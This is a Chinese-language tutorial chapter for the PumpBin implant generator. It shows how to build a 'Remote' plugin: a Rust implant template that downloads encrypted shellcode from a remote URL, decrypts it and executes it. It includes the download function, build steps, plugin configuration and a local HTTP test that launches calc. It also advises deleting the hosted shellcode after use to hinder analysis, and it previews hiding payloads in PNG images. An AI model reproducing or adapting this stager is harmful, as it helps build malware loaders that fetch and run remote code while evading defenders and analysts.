# Remote Type

在这一章, 我们将制作一个`Remote`类型的Plugin.

`Remote`类型的Plugin, shellcode托管在远程服务器上, 可以通过控制shellcode的访问性, 使shellcode更难被提取分析, 从而保护基础设施.

例如, 在植入物运行成功后, 将远程shellcode文件删除. (前提是你没有其他依赖这个链接的植入物需要运行)

建议始终给每个生成的最终植入物设置一个唯一的shellcode托管地址(一个最终植入物对应一个链接)

## 制作二进制植入物模板

我们将在[上一章代码](https://github.com/pumpbin/pumpbin/tree/main/examples/create_thread_encrypt)的基础上进行修改

首先, 我们需要一种方式从远程服务器获取加密的shellcode文件, 而不是将shellcode占位数据预先包含到二进制植入物模板中.

删除build.rs (不再需要生成shellcode占位数据).

在Cargo.toml末尾添加依赖项, 本例中使用http协议作为演示. (可以使用任何协议, 或以任何方式实现下载函数)

```toml
reqwest = { version = "0.12.5", features = ["blocking"] }
```

在main.rs的main函数上添加如下下载函数

```rust
fn download() -> Vec<u8> {
    const URL: &[u8; 81] =
        b"$$UURRLL$$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    let url = CStr::from_bytes_until_nul(URL).unwrap();
    reqwest::blocking::get(url.to_str().unwrap())
        .unwrap()
        .bytes()
        .unwrap()
        .to_vec()
}
```

$$UURRLL$$是一个`Prefix`, 这意味着URL常量会以有效数据+随机数据填充, 所以建议预留一部分字节让PumpBin填充随机字节.

由于url或之类的托管地址大部分都是可打印字符, 所以此处的处理与第一章中$$SHELLCODE$$ `Prefix`略有不同.

我们不再需要Size Holder来区分有效数据, 相反PumpBin会在有效数据后添加一个\\x00字节, 以定位有效数据.
(所以实际最大URL长度会比Max Len少一个字节, 因为末尾一定会添加一个\\x00字节)

这在rust中很容易实现, 其他语言应该也有类似的实现. 如果没有, 只需要for循环逐字节判断是否是\\x00字节.

实现了下载函数后, 我们需要在main.rs中使用它替换shellcode占位数据

删除main.rs中main函数的前四行代码, 并在第一行添加以下代码

```rust
let shellcode = download();
let shellcode = shellcode.as_slice();
```

修改后的main函数如下

```rust
fn main() {
    let shellcode = download();
    let shellcode = shellcode.as_slice();
    let shellcode = decrypt(shellcode);
    let shellcode_size = shellcode.len();
    ...
```

编译修改后的`create_thread`项目, 我们将得到一个使用http协议下载加密shellcode文件的二进制植入物模板.

```sh
cargo b -r
```

## 制作Plugin

使用PumpBin Maker制作Plugin, 与前面章节类似.

Prefix填写`$$UURRLL$$`

Max Len填写URL常量数组引用的长度 81.

Type选择`Remote`

> 下载编译后的[aes256_gcm.wasm](https://github.com/pumpbin/plug-in/releases), 并将文件路径输入到到PumpBin Maker中的`Encrypt Shellcode Plug-in`输入框中. (也可以使用文件选择对话框选择下载的`aes256_gcm.wasm`文件)

> Plugin Name填写first_plugin. (这个字段是Plugin的唯一标识, 这意味着用户无法同时安装两个同名的Plugin)

> Windows Exe选择我们上面编译好的二进制植入物模板. (也可以直接填写文件路径)

> 点击Generate, 保存生成的b1n文件

## 测试Plugin

用PumpBin安装制作的Plugin, 点击Encrypt按钮选择`w64-exec-calc-shellcode-func`生成加密的shellcode文件.

使用Python3在加密后的shellcode文件同级目录下开启一个http服务

```sh
python -m http.server 8000
```

加密shellcode文件的本地http地址应该是`http://127.0.0.1:8000/shellcode.enc`

填入PumpBin, 生成最终植入物, 运行应该看到访问请求, calc程序被启动.

<div class="warning">

如果使用的Encrypt Shellcode Plug-in使用随机加密密码

每次点击Encrypt按钮成功加密shellcode后, 都将更新内部记录的随机加密密码(因为需要将真实加密密码patch到二进制植入物模板中).
如果你加密了一次shellcode(称其为shellcode0), 将shellcode0上传到远程服务器, 并将链接填写到PumpBin中,
但是在生成最终植入物前, 又加密了一次shellcode(称其为shellcode1), 然后再生成最终植入物, 那么生成的最终植入物只能解密shellcode1, 而无法解密远程的shellcode0文件.

</div>

后续章节将介绍如何开发PumpBin Extism Plug-in, 以及更多的内部细节, 帮助赛博安全研究员应对复杂的需求.

比如: 如何在用户点击Encrypt按钮加密shellcode后将加密的shellcode隐写到png文件中, 再将png文件上传到某个网站,
上传成功后将远程png文件访问地址自动填写到shellcode url输入框中.

本例中的完整项目文件在PumpBin代码仓库的[examples/create_thread_remote](https://github.com/pumpbin/pumpbin/blob/main/examples/create_thread_remote/src/main.rs).
